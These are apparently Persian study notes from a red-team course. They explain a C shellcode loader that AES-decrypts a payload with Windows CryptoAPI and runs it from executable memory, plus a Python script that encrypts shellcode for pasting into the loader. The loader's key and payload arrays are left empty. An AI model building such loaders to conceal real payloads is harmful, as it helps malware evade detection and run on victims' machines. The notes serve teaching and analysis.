
### Dcrypt And Execute

```c++

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>


int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &payload_len)){
                return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}


int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;

	char key[] = 
	unsigned char calc_payload[] = 
	unsigned int calc_len = sizeof(calc_payload);
	
	// Allocate memory for payload
	exec_mem = VirtualAlloc(0, calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "calc_payload addr", (void *)calc_payload);
	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);

	printf("\nHit me 1st!\n");
	getchar();

	// Decrypt payload
	AESDecrypt((char *) calc_payload, calc_len, key, sizeof(key));
	
	// Copy payload to allocated buffer
	RtlMoveMemory(exec_mem, calc_payload, calc_len);
	
	// Make the buffer executable
	rv = VirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);

	printf("\nHit me 2nd!\n");
	getchar();

	// If all good, launch the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}

```


عالیه. این تابع نسبت به XOR یک جهش بزرگ محسوب می‌شود، چون اینجا دیگر خود برنامه الگوریتم AES را پیاده‌سازی نمی‌کند؛ بلکه از **Windows CryptoAPI** استفاده می‌کند. در واقع تو فقط APIهای ویندوز را صدا می‌زنی و تمام عملیات رمزنگاری داخل کتابخانه‌های ویندوز انجام می‌شود.

بیایید خط به خط تابع را بررسی کنیم.

---

# امضای تابع

```c
int AESDecrypt(char *payload,
               unsigned int payload_len,
               char *key,
               size_t keylen)
```

پارامترها:

- `payload` → داده رمز شده (Ciphertext)
    
- `payload_len` → طول Payload
    
- `key` → رمز عبور یا Password
    
- `keylen` → طول Password
    

فرض کنیم

```
Payload = AES Encrypted Shellcode
Key     = "mysecretpassword"
```

هدف تابع این است که:

```
Encrypted Payload
        │
        ▼
تولید کلید AES
        │
        ▼
CryptDecrypt()
        │
        ▼
Original Shellcode
```

---

# متغیرها

```c
HCRYPTPROV hProv;
HCRYPTHASH hHash;
HCRYPTKEY hKey;
```

سه Handle هستند.

تقریباً مثل Handle فایل.

```
HANDLE File
HANDLE Process
HANDLE Thread
```

اینجا هم داریم

```
Crypto Provider
Hash Object
AES Key
```

---

# مرحله اول

```c
CryptAcquireContextW(
    &hProv,
    NULL,
    NULL,
    PROV_RSA_AES,
    CRYPT_VERIFYCONTEXT
);
```

این اولین API مهم است.

وظیفه‌اش:

> "به Windows CryptoAPI وصل شو."

تقریباً شبیه این است:

```
CreateFile()
```

که اول فایل را باز می‌کنی.

اینجا هم اول Provider را باز می‌کنی.

---

### hProv چیست؟

بعد از موفقیت

```
hProv
```

اشاره می‌کند به یک

```
Cryptographic Service Provider
```

یا CSP

که داخل ویندوز مسئول انجام عملیات رمزنگاری است.

---

### PROV_RSA_AES

```c
PROV_RSA_AES
```

یعنی

> Providerای را انتخاب کن که RSA و AES را پشتیبانی می‌کند.

اگر مثلاً DES می‌خواستی، Provider دیگری هم وجود داشت.

---

### CRYPT_VERIFYCONTEXT

این Flag خیلی مهم است.

یعنی

> من فقط می‌خواهم عملیات رمزنگاری انجام دهم.

نه اینکه

- Certificate بسازم
    
- Key Container ایجاد کنم
    
- Private Key ذخیره کنم
    

پس Provider را در حالت موقت (Ephemeral) باز می‌کند.

---

# مرحله دوم

```c
CryptCreateHash(
    hProv,
    CALG_SHA_256,
    0,
    0,
    &hHash
);
```

اینجا هنوز AES Key ساخته نشده است.

بلکه یک شیء Hash ساخته می‌شود.

```
Password

↓

SHA256 Object
```

---

### CALG_SHA_256

یعنی

```
Hash Algorithm

↓

SHA-256
```

---

بعد از این دستور

```
hHash
```

یک Hash Object خالی است.

هنوز هیچ داده‌ای داخلش نیست.

---

# مرحله سوم

```c
CryptHashData(
    hHash,
    (BYTE*)key,
    (DWORD)keylen,
    0
);
```

اینجا Password وارد Hash می‌شود.

فرض کن

```
key

↓

mysecretpassword
```

بعد از این دستور

داخل

```
hHash
```

قرار می‌گیرد

```
SHA256(mysecretpassword)
```

---

مثلاً

```
Password

↓

mysecretpassword

↓

SHA256

↓

F3 81 9A ...
```

یک Hash 256 بیتی تولید می‌شود.

---

# سؤال مهم

چرا مستقیم از Password استفاده نمی‌کنیم؟

چون AES-256 دقیقاً یک کلید ۳۲ بایتی می‌خواهد.

ولی Password ممکن است

```
5 bytes

یا

12 bytes

یا

50 bytes
```

باشد.

بنابراین اول Password را به SHA256 تبدیل می‌کنند.

تا همیشه

```
32 Bytes
```

داشته باشیم.

---

# مرحله چهارم

```c
CryptDeriveKey(
    hProv,
    CALG_AES_256,
    hHash,
    0,
    &hKey
);
```

این مهم‌ترین قسمت تابع است.

اینجا Hash تبدیل می‌شود به AES Key.

```
Password

↓

SHA256

↓

Hash

↓

AES Key
```

دقت کن:

Hash خودش کلید AES نیست.

بلکه CryptoAPI از Hash برای تولید کلید استفاده می‌کند.

---

در نهایت

```
hKey
```

حاوی

```
AES-256 Session Key
```

است.

---

# مرحله پنجم

```c
CryptDecrypt(
    hKey,
    NULL,
    0,
    0,
    payload,
    &payload_len
);
```

اینجا عملیات واقعی Decryption انجام می‌شود.

ورودی

```
Encrypted Payload
```

است.

کلید

```
hKey
```

است.

خروجی

```
Original Shellcode
```

خواهد بود.

---

### نکته خیلی مهم

```
payload
```

هم ورودی است

هم خروجی.

یعنی

قبل

```
payload

↓

Encrypted
```

بعد از پایان

```
payload

↓

Decrypted
```

در همان حافظه.

به همین دلیل تابع

```
malloc()
```

نمی‌کند.

---

# چرا payload_len آدرسش ارسال شده؟

```c
&payload_len
```

چون

```
CryptDecrypt()
```

ممکن است اندازه واقعی داده را تغییر دهد.

مثلاً اگر Padding حذف شود.

بنابراین API طول نهایی را هم برمی‌گرداند.

---

# مرحله آخر

```c
CryptReleaseContext(...)
```

Provider بسته می‌شود.

---

```c
CryptDestroyHash(...)
```

Hash Object آزاد می‌شود.

---

```c
CryptDestroyKey(...)
```

AES Key از حافظه حذف می‌شود.

---

## کل جریان را به شکل یک دیاگرام ببین

```
             key
              │
              ▼
     CryptHashData()
              │
              ▼
        SHA256 Hash
              │
              ▼
      CryptDeriveKey()
              │
              ▼
      AES-256 Session Key
              │
              ▼
       CryptDecrypt()
              │
              ▼
      Original Shellcode
```

---

# تفاوت این روش با XOR

در تابع XOR:

```
Plaintext
     │
     ▼
XOR با کلید
     │
     ▼
Ciphertext
```

کلید مستقیماً روی داده اعمال می‌شد.

اما در AES:

```
Password
     │
     ▼
SHA-256
     │
     ▼
AES Key
     │
     ▼
AES Decrypt
     │
     ▼
Payload
```

یعنی Password ابتدا به یک کلید استاندارد AES تبدیل می‌شود و سپس الگوریتم AES روی داده اجرا می‌شود.

---

### یک نکته مهم برای Red Team

این کد از **CryptoAPI** (`CryptAcquireContext`، `CryptDeriveKey`، `CryptDecrypt`) استفاده می‌کند که API قدیمی ویندوز است. امروزه در ویندوز، مایکروسافت استفاده از **Cryptography Next Generation (CNG)** و APIهایی مثل `BCryptOpenAlgorithmProvider`، `BCryptGenerateSymmetricKey` و `BCryptDecrypt` را توصیه می‌کند. با این حال، هنوز هم در بسیاری از ابزارهای Red Team، بدافزارهای قدیمی و حتی برخی نرم‌افزارهای تجاری، CryptoAPI را زیاد می‌بینی؛ بنابراین شناخت آن برای تحلیل کد و مهندسی معکوس همچنان ارزشمند است.



#### Encrypt Data

```python
# Red Team Operator course code template
# payload encryption with AES
# 
# author: reenz0h (twitter: @sektor7net)

import sys
from Crypto.Cipher import AES
from os import urandom
import hashlib

KEY = urandom(16)

def pad(s):
	return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)

def aesenc(plaintext, key):

	k = hashlib.sha256(key).digest()
	iv = 16 * '\x00'
	plaintext = pad(plaintext)
	cipher = AES.new(k, AES.MODE_CBC, iv)

	return cipher.encrypt(bytes(plaintext))


try:
    plaintext = open(sys.argv[1], "r").read()
except:
    print("File argument needed! %s <raw payload file>" % sys.argv[0])
    sys.exit()

ciphertext = aesenc(plaintext, KEY)
print('AESkey[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in KEY) + ' };')
print('payload[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')

```


```text
Python
--------
Raw Shellcode
      │
      ▼
AES Encrypt
      │
      ▼
Ciphertext
      │
      ▼
چاپ به صورت آرایه C

             ↓ Copy/Paste

C Loader
--------
Ciphertext
      │
      ▼
AESDecrypt()
      │
      ▼
Original Shellcode
      │
      ▼
VirtualAlloc
VirtualProtect
CreateThread
```

حالا برویم خط به خط.

---

# Import ها

```python
import sys
```

برای گرفتن آرگومان خط فرمان.

مثلاً

```bash
python aes.py calc.bin
```

در این حالت

```python
sys.argv[1]
```

برابر است با

```text
calc.bin
```

---

بعد

```python
from Crypto.Cipher import AES
```

اینجا از کتابخانه PyCrypto (یا PyCryptodome) کلاس AES را وارد می‌کند.

در نتیجه دیگر لازم نیست خودمان الگوریتم AES را بنویسیم.

---

بعد

```python
from os import urandom
```

این تابع از سیستم‌عامل **اعداد تصادفی رمزنگاری‌شده (Cryptographically Secure Random)** می‌گیرد.

نه مثل

```python
random.random()
```

که برای امنیت مناسب نیست.

---

بعد

```python
import hashlib
```

برای محاسبه SHA256.

دقیقاً مشابه

```c
CryptCreateHash()

CryptHashData()
```

در CryptoAPI.

---

# ساخت کلید

```python
KEY = urandom(16)
```

اینجا یک سؤال مهم پیش می‌آید.

چرا 16 بایت؟

AES سه اندازه کلید دارد.

|نوع|اندازه کلید|
|---|---|
|AES-128|16 Bytes|
|AES-192|24 Bytes|
|AES-256|32 Bytes|

ولی اینجا بعداً قرار است

```python
hashlib.sha256(KEY)
```

را اجرا کنیم.

پس

```text
16 Bytes

↓

SHA256

↓

32 Bytes
```

در نهایت تبدیل به AES-256 می‌شود.

---

# تابع pad()

```python
def pad(s):
```

این تابع خیلی مهم است.

---

### چرا Padding لازم داریم؟

AES روی بلوک‌های 16 بایتی کار می‌کند.

فرض کن متن

```text
HELLO
```

باشد.

طولش

```text
5 Bytes
```

ولی AES فقط این اندازه‌ها را قبول می‌کند:

```text
16

32

48

64
```

بنابراین باید متن را پر کنیم.

---

فرض کنیم

```text
HELLO
```

۵ بایت است.

نیاز داریم

```text
11 Bytes
```

دیگر اضافه کنیم.

تابع می‌سازد

```text
HELLO

0B 0B 0B 0B 0B 0B
0B 0B 0B 0B 0B
```

چرا

```text
0B
```

؟

چون

```text
11 decimal

=

0x0B
```

این دقیقاً استاندارد **PKCS#7 Padding** است.

---

حالا خود کد را ببین.

```python
AES.block_size
```

همیشه

```text
16
```

است.

---

فرض کنیم

```text
len(s)=22
```

آن وقت

```text
22 %16

=

6
```

پس

```text
16-6

=

10
```

باید

۱۰ بایت اضافه شود.

---

کد

```python
chr(10)
```

می‌سازد

```text
0x0A
```

و ۱۰ بار آن را تکرار می‌کند.

---

در نتیجه

```text
AAAAAAAAAAAAAAAAAAAAAA

↓

AAAAAAAAAAAAAAAAAAAAAA
0A0A0A0A0A0A0A0A0A0A
```

---

# aesenc()

```python
def aesenc(plaintext,key):
```

این همان تابع Encrypt است.

---

## مرحله اول

```python
k = hashlib.sha256(key).digest()
```

این دقیقاً معادل این قسمت C است.

```c
CryptCreateHash()

CryptHashData()

CryptDeriveKey()
```

در پایتون:

```text
Password

↓

SHA256

↓

32 Byte Key
```

---

### digest()

اگر بنویسی

```python
hexdigest()
```

خروجی

```text
AF19D8...
```

به صورت رشته Hex است.

ولی

```python
digest()
```

برمی‌گرداند

```text
AF 19 D8 ...
```

به صورت Bytes.

AES همین را لازم دارد.

---

# IV

```python
iv = 16 * '\x00'
```

یعنی

```text
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
```

---

این همان Initialization Vector است.

در CBC هر بلوک به بلوک قبلی وابسته است.

بلوک اول چون قبلی ندارد از IV استفاده می‌کند.

---

در این مثال

IV

ثابت است.

---

از نظر آموزشی اشکالی ندارد.

ولی در عمل

IV ثابت

امن نیست.

---

# Padding

```python
plaintext = pad(plaintext)
```

اگر Payload

```text
37 Bytes
```

باشد

Padding اضافه می‌شود.

---

# ساخت Cipher

```python
cipher = AES.new(
        k,
        AES.MODE_CBC,
        iv
)
```

سه چیز به AES داده می‌شود.

```text
Key

Mode

IV
```

---

### MODE_CBC

AES فقط الگوریتم است.

Mode نحوه استفاده از آن را مشخص می‌کند.

مثل

```text
ECB

CBC

CFB

CTR

GCM
```

اینجا از CBC استفاده شده است.

---

# Encrypt

```python
return cipher.encrypt(
            bytes(plaintext)
)
```

در نهایت

```text
Plaintext

↓

AES-CBC

↓

Ciphertext
```

---

# خواندن فایل

```python
plaintext =
open(sys.argv[1],"r").read()
```

اینجا یک نکته مهم وجود دارد.

اگر واقعاً قرار باشد Shellcode را بخوانیم

نباید

```python
"r"
```

باشد.

باید

```python
"rb"
```

باشد.

چون Shellcode

متن نیست.

بلکه

```text
FC 48 83 E4 ...
```

است.

---

# چاپ کلید

```python
print(
AESkey[] = ...
)
```

خروجی می‌شود

```text
AESkey[] =
{
0x41,
0x22,
0x93,
...
};
```

که مستقیم داخل C کپی می‌شود.

---

# چاپ Payload

همین کار را برای Ciphertext انجام می‌دهد.

---

# نکته خیلی مهم

اگر این اسکریپت را با کد C کنار هم بگذاری، می‌بینی که دقیقاً با هم سازگار طراحی شده‌اند:

در پایتون:

```text
KEY
 │
 ▼
SHA256
 │
 ▼
AES-CBC Encrypt
 │
 ▼
Ciphertext
```

در C:

```text
KEY
 │
 ▼
CryptHashData
 │
 ▼
SHA256
 │
 ▼
CryptDeriveKey
 │
 ▼
AES-CBC Decrypt
 │
 ▼
Plaintext
```

یعنی **همان کلید اولیه** در هر دو سمت استفاده می‌شود، اما هر دو برنامه ابتدا آن را با SHA-256 به یک کلید ۳۲ بایتی تبدیل می‌کنند و سپس با همان کلید AES عملیات رمزگذاری/رمزگشایی را انجام می‌دهند.

---

## چند ایراد یا نکته قدیمی در این اسکریپت

این کد متعلق به دوره‌های قدیمی Sektor7 است و اگر امروز بخواهی آن را اجرا کنی، احتمالاً نیاز به اصلاح دارد:

1. **فایل باید با `"rb"` باز شود، نه `"r"`**، چون شل‌کد دادهٔ باینری است.
    
2. در **Python 3**، `KEY` از نوع `bytes` است و استفاده از `ord(x)` روی بایت‌ها خطا می‌دهد. برای چاپ آرایه باید مستقیماً روی اعداد بایت‌ها پیمایش کنی.
    
3. **IV ثابت (`00...00`)** برای آموزش مناسب است، اما در نرم‌افزارهای واقعی بهتر است IV تصادفی تولید و همراه Ciphertext ذخیره یا ارسال شود، چون استفادهٔ مکرر از IV ثابت در حالت CBC امنیت را کاهش می‌دهد.
    

این تفاوت‌ها بیشتر به دلیل قدیمی بودن نمونه‌کد است، نه اشتباه بودن ایدهٔ اصلی آن.